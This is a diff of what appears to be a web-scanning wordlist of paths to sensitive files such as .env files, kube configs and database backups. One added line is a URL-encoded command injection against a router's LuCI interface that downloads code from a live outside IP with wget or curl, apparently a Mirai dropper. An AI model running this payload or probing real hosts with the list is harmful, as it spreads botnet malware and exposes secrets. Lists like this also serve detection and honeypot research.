@@ -82,11 +82,11 @@ wp-config.php.bak
 .kube/config
 application/.env
 backup.sql
+geoserver/web/
 site.zip
 .env.json
 .env.php
 db.sql
-geoserver/web/
 package.json
 staging/.env
 backup/.env
@@ -1047,6 +1047,7 @@ c/login
 cdw-backend/.env
 cert.pem
 cgi-bin/info.cgi
+cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(echo%20MIRAI_%24%28echo%20RS%29_18fbd45a46c90e0e%3B%20busybox%20wget%20-qO-%20http%3A%2F%2F43.228.157.59%3A38243%2FCB_18fbd45a46c922ff%20%7C%7C%20wget%20-qO-%20http%3A%2F%2F43.228.157.59%3A38243%2FCB_18fbd45a46c922ff%20%7C%7C%20curl%20-s%20http%3A%2F%2F43.228.157.59%3A38243%2FCB_18fbd45a46c922ff)
 cgi-bin/param.cgi?get_device_conf
 cgi-mod/header_logo.cgi?size=big
 ch6-mytodo/.env
